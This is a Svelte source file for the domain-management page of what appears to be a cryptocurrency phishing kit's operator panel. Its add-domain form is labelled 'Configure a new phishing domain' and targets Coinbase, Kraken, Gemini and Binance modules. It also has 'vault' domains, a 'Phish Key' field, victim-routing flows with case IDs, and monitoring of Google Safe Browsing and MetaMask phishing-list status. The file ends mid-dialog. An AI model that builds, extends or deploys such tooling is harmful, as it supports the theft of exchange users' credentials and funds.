<script lang="ts">
	import { onMount } from 'svelte';
	import {
		Globe,
		Plus,
		Search,
		Trash2,
		Copy,
		ExternalLink,
		Check,
		Pencil,
		ChevronDown,
		ChevronUp,
		ShieldCheck,
		ShieldAlert,
		ShieldQuestion,
		Activity,
		Cloud,
		RefreshCw,
		Zap,
		Hash,
		Settings as SettingsIcon
	} from 'lucide-svelte';
	import type { CustomDomain } from '$lib/server/state';
	import { MODULES, getLandingPagesFor } from '$lib/modules';
	import { toast } from '$lib/stores/toast';
	import { flows } from '$lib/stores/websocket';

	const AUTO_MODE_KEY = 'domains-auto-mode';

	let domains: CustomDomain[] = $state([]);
	let loading = $state(false);
	let searchQuery = $state('');
	let sortBy = $state<'domain' | 'module' | 'status'>('domain');
	let sortDir = $state<'asc' | 'desc'>('asc');
	let autoMode = $state(false);
	let editorOpen = $state(false);
	let addOpen = $state(false);
	let editing = $state<CustomDomain | null>(null);
	let copied = $state<string | null>(null);
	let expanded = $state<Record<string, boolean>>({});
	let confirmDeleteDomain = $state<CustomDomain | null>(null);
	let adding = $state(false);

	// Add-form state
	let newDomain = $state('');
	let newKind = $state<'regular' | 'vault'>('regular');
	let newModule = $state('Coinbase');
	let newLanding = $state('/loading');
	let newFlowId = $state('');

	// Edit-form state
	let editModule = $state('Coinbase');
	let editLanding = $state('/loading');
	let editFlowId = $state('');

	async function fetchDomains() {
		loading = true;
		try {
			const res = await fetch('/api/domains');
			if (res.ok) {
				const data = await res.json();
				domains = data.domains;
			} else {
				toast.error('Failed to load domains');
			}
		} finally {
			loading = false;
		}
	}

	onMount(() => {
		try {
			autoMode = localStorage.getItem(AUTO_MODE_KEY) === '1';
		} catch {}
		fetchDomains();
	});

	function setAutoMode(enabled: boolean) {
		autoMode = enabled;
		try {
			localStorage.setItem(AUTO_MODE_KEY, enabled ? '1' : '0');
		} catch {}
		toast.info(`Auto mode ${enabled ? 'enabled' : 'disabled'}`);
	}

	let filtered = $derived(
		domains
			.filter((d) => {
				if (!searchQuery.trim()) return true;
				const q = searchQuery.toLowerCase();
				return (
					d.domain.toLowerCase().includes(q) ||
					d.module.toLowerCase().includes(q) ||
					d.landingPage.toLowerCase().includes(q)
				);
			})
			.sort((a, b) => {
				const av = (a[sortBy] || '').toString().toLowerCase();
				const bv = (b[sortBy] || '').toString().toLowerCase();
				const cmp = av.localeCompare(bv);
				return sortDir === 'asc' ? cmp : -cmp;
			})
	);

	let regularDomains = $derived(filtered.filter((d) => d.kind !== 'vault'));
	let vaultDomains = $derived(filtered.filter((d) => d.kind === 'vault'));

	function copyToClipboard(text: string, key: string) {
		navigator.clipboard?.writeText(text);
		copied = key;
		toast.success('Copied to clipboard');
		setTimeout(() => (copied = null), 1200);
	}

	function previewUrl(d: CustomDomain): string {
		return `https://${d.domain}${d.landingPage}`;
	}

	async function addDomain() {
		if (!newDomain.trim() || adding) return;
		adding = true;
		const trimmed = newDomain.trim();
		const res = await fetch('/api/domains', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				domain: trimmed,
				module: newModule,
				landingPage: newLanding,
				kind: newKind,
				flowId: newFlowId
			})
		});
		if (res.ok) {
			const data = await res.json().catch(() => null);
			const newId = data?.domain?.id as string | undefined;
			newDomain = '';
			newKind = 'regular';
			newModule = 'Coinbase';
			newLanding = '/loading';
			newFlowId = '';
			addOpen = false;
			await fetchDomains();
			toast.success(`Added domain ${trimmed}`);
			if (autoMode && newId) {
				toast.info('Auto mode: running DNS sync + safety check…');
				try {
					await fetch(`/api/domains/${newId}/sync-dns`, {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: '{}'
					});
					await fetch(`/api/domains/${newId}/check-safety`, { method: 'POST' });
					await fetch(`/api/domains/${newId}/check-status`, { method: 'POST' });
					await fetchDomains();
					toast.success('Auto mode checks complete');
				} catch {
					toast.error('Auto mode checks failed');
				}
			}
		} else {
			toast.error('Failed to add domain');
		}
		adding = false;
	}

	async function deleteDomain(d: CustomDomain) {
		confirmDeleteDomain = d;
	}

	async function performDeleteDomain() {
		if (!confirmDeleteDomain) return;
		const d = confirmDeleteDomain;
		confirmDeleteDomain = null;
		const res = await fetch(`/api/domains/${d.id}`, { method: 'DELETE' });
		if (res.ok) {
			toast.success(`Deleted ${d.domain}`);
		} else {
			toast.error('Failed to delete domain');
		}
		await fetchDomains();
	}

	async function patchDomain(id: string, patch: Partial<CustomDomain>) {
		const res = await fetch(`/api/domains/${id}`, {
			method: 'PATCH',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify(patch)
		});
		if (res.ok) {
			const data = await res.json();
			if (data.domain) {
				domains = domains.map((d) => (d.id === id ? data.domain : d));
			}
		} else {
			toast.error('Failed to update domain');
		}
	}

	async function checkStatus(d: CustomDomain) {
		const res = await fetch(`/api/domains/${d.id}/check-status`, { method: 'POST' });
		await fetchDomains();
		if (res.ok) toast.info(`Checked status for ${d.domain}`);
		else toast.error(`Failed to check status for ${d.domain}`);
	}

	async function checkSafety(d: CustomDomain) {
		const res = await fetch(`/api/domains/${d.id}/check-safety`, { method: 'POST' });
		await fetchDomains();
		if (res.ok) toast.info(`Checked safety for ${d.domain}`);
		else toast.error(`Failed to check safety for ${d.domain}`);
	}

	async function syncDns(d: CustomDomain) {
		const res = await fetch(`/api/domains/${d.id}/sync-dns`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: '{}'
		});
		if (res.ok) {
			const data = await res.json();
			if (data.ok) {
				toast.success(`DNS sync requested for ${d.domain}`);
			} else {
				toast.error('DNS sync failed (Cloudflare not configured?)');
			}
		} else {
			toast.error('DNS sync request failed');
		}
	}

	async function toggleUnderAttack(d: CustomDomain) {
		const newVal = !d.underAttack;
		await fetch(`/api/domains/${d.id}/under-attack`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ enabled: newVal })
		});
		await fetchDomains();
		toast.info(`Under-attack mode ${newVal ? 'enabled' : 'disabled'} for ${d.domain}`);
	}

	function openEdit(d: CustomDomain) {
		editing = d;
		editModule = d.module;
		editLanding = d.landingPage;
		editFlowId = d.flowId || '';
		editorOpen = true;
	}

	async function saveEdit() {
		if (!editing) return;
		const name = editing.domain;
		await patchDomain(editing.id, { module: editModule, landingPage: editLanding, flowId: editFlowId });
		editorOpen = false;
		editing = null;
		toast.success(`Saved changes to ${name}`);
	}

	function safetyClass(s: string): string {
		if (s === 'safe') return 'border-emerald-500/30 bg-emerald-500/10 text-emerald-300';
		if (s === 'unsafe') return 'border-red-500/30 bg-red-500/10 text-red-300';
		return 'border-[var(--border)] bg-[var(--accent)]/30 text-[var(--muted-foreground)]';
	}

	function statusClass(s: string): string {
		if (s === 'active') return 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]';
		if (s === 'pending') return 'border-amber-400/30 bg-amber-400/10 text-amber-300';
		return 'border-[var(--border)] bg-[var(--accent)]/30 text-[var(--muted-foreground)]';
	}

	function moduleColor(m: string): string {
		const lc = (m || '').toLowerCase();
		if (lc.includes('vault')) return 'bg-purple-500/15 text-purple-300 border-purple-500/25';
		if (lc.includes('coinbase')) return 'bg-blue-500/15 text-blue-300 border-blue-500/25';
		if (lc.includes('kraken')) return 'bg-violet-500/15 text-violet-300 border-violet-500/25';
		if (lc.includes('gemini')) return 'bg-cyan-500/15 text-cyan-300 border-cyan-500/25';
		if (lc.includes('binance')) return 'bg-amber-500/15 text-amber-300 border-amber-500/25';
		return 'bg-[var(--accent)]/30 text-[var(--muted-foreground)] border-[var(--border)]';
	}

	function isSubdomain(domain: string): boolean {
		return domain.split('.').length > 2;
	}

	function landingPagesForModule(moduleId: string) {
		return getLandingPagesFor(moduleId);
	}
</script>

<svelte:head>
	<title>Domains · Panel</title>
</svelte:head>

<svelte:window onkeydown={(e) => { if (e.key === 'Escape') { if (addOpen) addOpen = false; else if (editorOpen) editorOpen = false; else if (confirmDeleteDomain) confirmDeleteDomain = null; } }} />

<div class="p-8 pt-5">
	<!-- Header -->
	<div class="mb-6 flex items-start justify-between gap-3">
		<div>
			<h1 class="text-2xl font-bold text-[var(--foreground)]">Domains</h1>
			<p class="mt-1 text-sm text-[var(--muted-foreground)]">Manage your domains and configurations</p>
		</div>
		<div class="flex items-center gap-2">
			<button
				onclick={() => setAutoMode(!autoMode)}
				role="switch"
				aria-checked={autoMode}
				aria-label="Toggle auto mode (DNS sync + safety check on add)"
				class="flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-xs transition-soft {autoMode
					? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]'
					: 'border-[var(--border)] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)]'}"
				title={autoMode
					? 'Auto: On — new domains run DNS sync + safety check automatically'
					: 'Auto: Off — click to auto-run DNS sync + safety check when adding domains'}
			>
				<Zap size={12} />
				Auto: {autoMode ? 'On' : 'Off'}
			</button>
			<button
				onclick={fetchDomains}
				aria-label="Refresh domains"
				class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
			>
				<RefreshCw size={12} class={loading ? 'animate-spin' : ''} />
				Refresh
			</button>
			<button onclick={() => (addOpen = true)} class="btn-accent flex items-center gap-1.5 px-4 py-2 text-xs">
				<Plus size={13} />
				Add Domain
			</button>
		</div>
	</div>

	<!-- Toolbar -->
	<div class="mb-4 flex flex-wrap items-center justify-between gap-3 rounded-xl border border-[var(--border)] bg-[var(--card)] px-5 py-3">
		<div class="relative">
			<Search size={13} class="absolute left-3 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
			<input
				type="text"
				bind:value={searchQuery}
				placeholder="Search domains..."
				class="w-72 rounded-lg border border-[var(--border)] bg-[var(--input)] py-1.5 pl-8 pr-3 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
			/>
		</div>
		<div class="flex items-center gap-2">
			<select
				bind:value={sortBy}
				class="rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-1.5 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
			>
				<option value="domain">Sort by Domain</option>
				<option value="module">Sort by Module</option>
				<option value="status">Sort by Status</option>
			</select>
			<button
				onclick={() => (sortDir = sortDir === 'asc' ? 'desc' : 'asc')}
				class="rounded-lg border border-[var(--border)] p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
				aria-label="Toggle sort direction"
			>
				{#if sortDir === 'asc'}
					<ChevronUp size={13} />
				{:else}
					<ChevronDown size={13} />
				{/if}
			</button>
		</div>
	</div>

	<!-- Sections -->
	{#each [{ title: 'Regular Domains', items: regularDomains, kind: 'regular' as const }, { title: 'Vault Domains', items: vaultDomains, kind: 'vault' as const }] as section (section.kind)}
		<section class="mb-6">
			<h2 class="mb-3 text-sm font-semibold text-[var(--foreground)]">
				{section.title}
				<span class="ml-2 rounded-md border border-[var(--border)] bg-[var(--accent)]/30 px-2 py-0.5 text-[10px] font-medium text-[var(--muted-foreground)]">
					{section.items.length}
				</span>
			</h2>

			{#if section.items.length === 0}
				<div class="flex flex-col items-center justify-center rounded-xl border border-dashed border-[var(--border)] bg-[var(--card)]/50 py-10 text-center">
					<Globe size={32} class="mb-2 text-[var(--text-tertiary)]" />
					<p class="text-xs text-[var(--muted-foreground)]">
						No {section.kind === 'vault' ? 'vault' : 'regular'} domains yet.
					</p>
				</div>
			{:else}
				<div class="grid gap-4 lg:grid-cols-2">
					{#each section.items as d (d.id)}
						<div class="animate-fade-slide-up rounded-xl border border-[var(--border)] bg-[var(--card)] p-5 transition-panel">
							<!-- Card header -->
							<div class="flex items-start justify-between gap-3">
								<div class="min-w-0 flex-1">
									<div class="flex items-center gap-2">
										<h3 class="truncate font-mono text-sm font-semibold text-[var(--foreground)]">{d.domain}</h3>
										<span class="rounded-md border border-[var(--border)] bg-[var(--accent)]/30 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider text-[var(--muted-foreground)]">
											{isSubdomain(d.domain) ? 'SUB' : 'APEX'}
										</span>
										<button
											onclick={() => copyToClipboard(previewUrl(d), `url-${d.id}`)}
											class="rounded-md p-1 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
											title="Copy domain URL"
											aria-label="Copy domain URL"
										>
											{#if copied === `url-${d.id}`}
												<Check size={11} class="text-[var(--status-live)]" />
											{:else}
												<Copy size={11} />
											{/if}
										</button>
									</div>

									<!-- Module + landing -->
									<div class="mt-2 flex flex-wrap items-center gap-2">
										<span class="inline-flex items-center rounded-md border px-2 py-0.5 text-[11px] font-medium {moduleColor(d.module)}">
											{d.module}
										</span>
										<span class="font-mono text-[11px] text-[var(--muted-foreground)]">
											{d.landingPage}
										</span>
									</div>

									<!-- Status row -->
									<div class="mt-2 flex flex-wrap items-center gap-2">
										<span class="inline-flex items-center gap-1 rounded-md border px-2 py-0.5 text-[11px] font-medium {statusClass(d.status)}">
											<Activity size={10} />
											{d.status}
										</span>
										<span class="inline-flex items-center gap-1 rounded-md border px-2 py-0.5 text-[11px] font-medium {safetyClass(d.googleSafety)}" title="Google Safe Browsing">
											{#if d.googleSafety === 'safe'}
												<ShieldCheck size={10} />
											{:else if d.googleSafety === 'unsafe'}
												<ShieldAlert size={10} />
											{:else}
												<ShieldQuestion size={10} />
											{/if}
											Google {d.googleSafety}
										</span>
										<span class="inline-flex items-center gap-1 rounded-md border px-2 py-0.5 text-[11px] font-medium {safetyClass(d.metamaskSafety)}" title="MetaMask phishing list">
											{#if d.metamaskSafety === 'safe'}
												<ShieldCheck size={10} />
											{:else if d.metamaskSafety === 'unsafe'}
												<ShieldAlert size={10} />
											{:else}
												<ShieldQuestion size={10} />
											{/if}
											MetaMask {d.metamaskSafety}
										</span>
									</div>
								</div>
							</div>

							<!-- Toggles -->
							<div class="mt-4 grid grid-cols-2 gap-3">
								<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-3">
									<div class="mb-1 flex items-center justify-between">
										<span class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Under Attack Mode</span>
										<button
											onclick={() => toggleUnderAttack(d)}
											class="relative h-5 w-9 rounded-full transition-colors {d.underAttack ? 'bg-amber-500' : 'bg-[var(--input)]'}"
											aria-label="Toggle under attack mode"
										>
											<span class="absolute top-0.5 h-4 w-4 rounded-full bg-white transition-transform {d.underAttack ? 'translate-x-4' : 'translate-x-0.5'}"></span>
										</button>
									</div>
									<p class="text-[10px] text-[var(--muted-foreground)]">
										{d.underAttack ? 'Under Attack Mode is active' : 'Standard security level'}
									</p>
								</div>

								<div class="rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-3">
									<div class="mb-1 flex items-center justify-between">
										<span class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Serving</span>
										<button
											onclick={() => patchDomain(d.id, { serving: !d.serving })}
											class="relative h-5 w-9 rounded-full transition-colors {d.serving ? 'bg-[var(--status-live)]' : 'bg-[var(--input)]'}"
											aria-label="Toggle serving"
										>
											<span class="absolute top-0.5 h-4 w-4 rounded-full bg-white transition-transform {d.serving ? 'translate-x-4' : 'translate-x-0.5'}"></span>
										</button>
									</div>
									<p class="text-[10px] text-[var(--muted-foreground)]">
										{d.serving ? 'Domain is live — click to disable' : 'Domain disabled'}
									</p>
								</div>
							</div>

							<!-- ID Mode -->
							<div class="mt-3 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-3">
								<div class="mb-1.5 flex items-center justify-between">
									<span class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">ID Mode</span>
									<div class="flex items-center gap-1">
										<button
											onclick={() => patchDomain(d.id, { idMode: 'case_input' })}
											class="rounded-md px-2 py-0.5 text-[10px] {d.idMode === 'case_input' ? 'bg-[var(--accent-primary)]/20 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
										>
											Case Input
										</button>
										<button
											onclick={() => patchDomain(d.id, { idMode: 'url_param' })}
											class="rounded-md px-2 py-0.5 text-[10px] {d.idMode === 'url_param' ? 'bg-[var(--accent-primary)]/20 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
										>
											URL Param
										</button>
									</div>
								</div>
								{#if d.idMode === 'case_input'}
									<div class="flex items-center gap-2">
										<input
											type="text"
											value={d.caseId}
											onchange={(e) => patchDomain(d.id, { caseId: (e.target as HTMLInputElement).value })}
											placeholder="Case ID"
											class="flex-1 rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
										/>
										<button
											onclick={() => copyToClipboard(d.caseId, `case-${d.id}`)}
											class="rounded-md p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
											aria-label="Copy case ID"
										>
											{#if copied === `case-${d.id}`}
												<Check size={11} class="text-[var(--status-live)]" />
											{:else}
												<Copy size={11} />
											{/if}
										</button>
									</div>
								{:else}
									<p class="font-mono text-[11px] text-[var(--muted-foreground)]">
										?id={'{visitor-id}'}
									</p>
								{/if}
							</div>

							<!-- Action buttons -->
							<div class="mt-4 flex flex-wrap items-center gap-2">
								<button onclick={() => openEdit(d)} aria-label={`Edit domain ${d.domain}`} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-2.5 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
									<Pencil size={11} aria-hidden="true" />
									Edit Domain
								</button>
								<button onclick={() => checkStatus(d)} aria-label={`Check status for ${d.domain}`} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-2.5 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
									<Activity size={11} aria-hidden="true" />
									Check Status
								</button>
								<button onclick={() => checkSafety(d)} aria-label={`Check safety for ${d.domain}`} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-2.5 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
									<ShieldCheck size={11} aria-hidden="true" />
									Check Safety
								</button>
								<button onclick={() => syncDns(d)} aria-label={`Sync DNS for ${d.domain}`} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-2.5 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
									<Cloud size={11} aria-hidden="true" />
									Sync DNS
								</button>
								<button
									onclick={() => (expanded[d.id] = !expanded[d.id])}
									aria-expanded={!!expanded[d.id]}
									aria-label={expanded[d.id] ? `Hide details for ${d.domain}` : `Show details for ${d.domain}`}
									class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-2.5 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
								>
									{expanded[d.id] ? 'Less' : 'More'}
									{#if expanded[d.id]}
										<ChevronUp size={11} aria-hidden="true" />
									{:else}
										<ChevronDown size={11} aria-hidden="true" />
									{/if}
								</button>
								<button
									onclick={() => deleteDomain(d)}
									title={`Delete ${d.domain}`}
									class="ml-auto rounded-lg p-1.5 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]"
									aria-label={`Delete domain ${d.domain}`}
								>
									<Trash2 size={12} aria-hidden="true" />
								</button>
							</div>

							<!-- Expanded section (nameservers) -->
							{#if expanded[d.id]}
								<div class="mt-4 rounded-lg border border-[var(--border)] bg-[var(--input)]/30 p-3">
									<div class="mb-2 flex items-center justify-between">
										<span class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Cloudflare Nameservers</span>
										<span class="rounded-md border border-[var(--border)] bg-[var(--accent)]/30 px-1.5 py-0.5 text-[9px] font-medium text-[var(--muted-foreground)]">
											{d.cfStatus}
										</span>
									</div>
									{#if d.cfNsPrimary || d.cfNsSecondary}
										<div class="space-y-1.5">
											{#each [d.cfNsPrimary, d.cfNsSecondary].filter(Boolean) as ns}
												<div class="flex items-center justify-between gap-2 rounded-md bg-[var(--input)] px-2 py-1.5">
													<span class="font-mono text-[11px] text-[var(--foreground)]">{ns}</span>
													<button
														onclick={() => copyToClipboard(ns, `ns-${d.id}-${ns}`)}
														class="rounded-md p-1 text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
														aria-label="Copy nameserver"
													>
														{#if copied === `ns-${d.id}-${ns}`}
															<Check size={10} class="text-[var(--status-live)]" />
														{:else}
															<Copy size={10} />
														{/if}
													</button>
												</div>
											{/each}
										</div>
									{:else}
										<p class="text-[11px] text-[var(--muted-foreground)]">
											Click "Check Status" to fetch Cloudflare nameservers.
										</p>
									{/if}

									<div class="mt-3 grid grid-cols-2 gap-2 text-[11px]">
										<div>
											<p class="text-[var(--muted-foreground)]">Phish Key</p>
											<p class="mt-0.5 font-mono text-[var(--foreground)] truncate">{d.phishKey}</p>
										</div>
										<div>
											<p class="text-[var(--muted-foreground)]">Last Checked</p>
											<p class="mt-0.5 text-[var(--foreground)]">
												{d.lastChecked ? new Date(d.lastChecked).toLocaleString() : '—'}
											</p>
										</div>
									</div>
								</div>
							{/if}
						</div>
					{/each}
				</div>
			{/if}
		</section>
	{/each}
</div>

<!-- Add modal -->
{#if addOpen}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (addOpen = false)}>
		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<h3 class="text-base font-semibold text-[var(--foreground)]">Add Domain</h3>
			<p class="mt-1 text-sm text-[var(--muted-foreground)]">Configure a new phishing domain</p>

			<div class="mt-5 space-y-4">
				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Domain</label>
					<input bind:value={newDomain} type="text" placeholder="example.com" class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Kind</label>
					<div class="flex gap-2">
						<button onclick={() => (newKind = 'regular')} class="flex-1 rounded-lg border px-3 py-2 text-xs {newKind === 'regular' ? 'border-[var(--accent-primary)]/50 bg-[var(--accent-primary)]/10 text-[var(--text-accent)]' : 'border-[var(--border)] text-[var(--muted-foreground)]'}">Regular</button>
						<button onclick={() => (newKind = 'vault')} class="flex-1 rounded-lg border px-3 py-2 text-xs {newKind === 'vault' ? 'border-purple-500/50 bg-purple-500/10 text-purple-300' : 'border-[var(--border)] text-[var(--muted-foreground)]'}">Vault</button>
					</div>
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Target Module</label>
					<select
						bind:value={newModule}
						onchange={() => (newLanding = landingPagesForModule(newModule)[0]?.value || '/loading')}
						class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
					>
						{#each MODULES as m}
							<option value={m.id}>{m.label}</option>
						{/each}
					</select>
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Default Landing Page</label>
					<select bind:value={newLanding} class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
						{#each landingPagesForModule(newModule) as p}
							<option value={p.value}>{p.label} ({p.value})</option>
						{/each}
					</select>
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">Auto-Assign Flow (optional)</label>
					<select bind:value={newFlowId} onchange={() => {
						if (newFlowId) {
							const f = $flows.find((fl) => fl.id === newFlowId);
							const first = f?.steps.find((s) => /^[A-Z][^/]+\/.+/.test(s)) || '';
							if (first.includes('Case ID') || first === 'Binance/Case') {
								newLanding = '/case';
							}
						}
					}} class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
						<option value="">— None (visitors stay on landing page) —</option>
						{#each $flows.filter((f) => f.active) as f}
							<option value={f.id}>{f.name} ({f.steps.length} steps)</option>
						{/each}
					</select>
					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">Visitors landing on this domain will be routed through this flow.{#if newFlowId && newLanding === '/case'} Landing auto-set to /case.{/if}</p>
				</div>

				<p class="rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2 font-mono text-[11px] text-[var(--muted-foreground)]">
					Preview: https://{newDomain || 'example.com'}{newLanding}
				</p>
			</div>

			<div class="mt-6 flex justify-end gap-2">
				<button onclick={() => (addOpen = false)} class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={addDomain} disabled={!newDomain.trim() || adding} class="btn-accent px-4 py-2 text-sm disabled:opacity-50 disabled:cursor-not-allowed">{adding ? 'Adding…' : 'Add Domain'}</button>
			</div>
		</div>
	</div>
{/if}

<!-- Edit modal -->
{#if editorOpen && editing}
	<div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onclick={() => (editorOpen = false)}>
		<div class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl" onclick={(e) => e.stopPropagation()}>
			<h3 class="text-base font-semibold text-[var(--foreground)]">Edit Domain Configuration</h3>
			<p class="mt-1 font-mono text-xs text-[var(--muted-foreground)]">{editing.domain}</p>
			<p class="mt-1 text-xs text-[var(--text-tertiary)]">Configure module and landing page</p>

			<div class="mt-5 space-y-4">
				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">
						Target Module *
					</label>
					<select
						bind:value={editModule}
						onchange={() => (editLanding = landingPagesForModule(editModule)[0]?.value || '/loading')}
						class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
					>
						{#each MODULES as m}
							<option value={m.id}>{m.label}</option>
						{/each}
					</select>
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">
						Default Landing Page *
					</label>
					<select
						bind:value={editLanding}
						class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
					>
						{#each landingPagesForModule(editModule) as p}
							<option value={p.value}>{p.label} ({p.value})</option>
						{/each}
					</select>
				</div>

				<div>
					<label class="mb-1.5 block text-xs font-medium uppercase tracking-wider text-[var(--muted-foreground)]">
						Auto-Assign Flow
					</label>
					<select
						bind:value={editFlowId}
						onchange={() => {
							if (editFlowId) {
								const f = $flows.find((fl) => fl.id === editFlowId);
								const first = f?.steps.find((s) => /^[A-Z][^/]+\/.+/.test(s)) || '';
								if (first.includes('Case ID') || first === 'Binance/Case') {
									editLanding = '/case';
								}
							}
						}}
						class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
					>
						<option value="">— None (visitors stay on landing page) —</option>
						{#each $flows.filter((f) => f.active) as f}
							<option value={f.id}>{f.name} ({f.steps.length} steps)</option>
						{/each}
					</select>
					<p class="mt-1 text-[10px] text-[var(--text-tertiary)]">Visitors landing on this domain will be routed through this flow.</p>
				</div>

				<div class="rounded-md border border-[var(--border)] bg-[var(--input)]/30 px-3 py-2">
					<p class="text-[10px] uppercase tracking-wider text-[var(--muted-foreground)]">Preview URL:</p>
					<p class="mt-1 break-all font-mono text-xs text-[var(--foreground)]">
						https://{editing.domain}{editLanding}
					</p>
				</div>
			</div>

			<div class="mt-6 flex justify-end gap-2">
				<button onclick={() => (editorOpen = false)} class="rounded-lg border border-[var(--border)] px-4 py-2 text-sm text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)]">Cancel</button>
				<button onclick={saveEdit} class="btn-accent px-4 py-2 text-sm">Save Changes</button>
			</div>
		</div>
	</div>
{/if}

{#if confirmDeleteDomain}
	<div
		class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm"
		role="dialog"
		aria-modal="true"
		aria-labelledby="confirm-domain-delete-title"
		tabindex="-1"
		onclick={() => (confirmDeleteDomain = null)}
		onkeydown={(e) => e.key === 'Escape' && (confirmDeleteDomain = null)}
	>
		<div
			class="w-full max-w-md rounded-xl border border-[var(--border)] bg-[var(--card)] p-6 shadow-2xl"
			role="document"
			onclick={(e) => e.stopPropagation()}
			onkeydown={(e) => e.stopPropagation()}
		>
			<h3 id="confirm-domain-delete-title" class="text-base font-semibold text-[var(--foreground)]">
				Delete domain?
			</h3>
			<p class="mt-2 text-sm text-[var(--muted-foreground)]">
				This will permanently delete
				<span class="font-mono text-[var(--foreground)]">{confirmDeleteDomain.domain}</span>
				and stop serving it. This cannot be undone.
			</p>
			<div class="mt-6 flex justify-end gap-2">
				<button
